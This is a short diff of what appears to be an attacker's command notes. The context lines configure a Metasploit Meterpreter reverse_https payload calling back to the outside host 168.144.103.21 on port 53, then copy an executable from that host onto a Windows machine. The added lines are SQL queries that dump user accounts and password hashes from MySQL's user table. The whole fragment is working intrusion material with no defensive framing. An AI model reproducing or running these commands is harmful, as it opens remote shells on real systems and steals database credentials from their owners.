@@ -8,5 +8,6 @@ set PAYLOAD windows/x64/meterpreter/reverse_https
 set LHOST 168.144.103.21
 set LPORT 53
 scp root@168.144.103.21:x64P53.exe C:\Users\Public
-
+SELECT User, Host, plugin, authentication_string FROM mysql.user;
+ SELECT User, Host, Password FROM mysql.user;
 
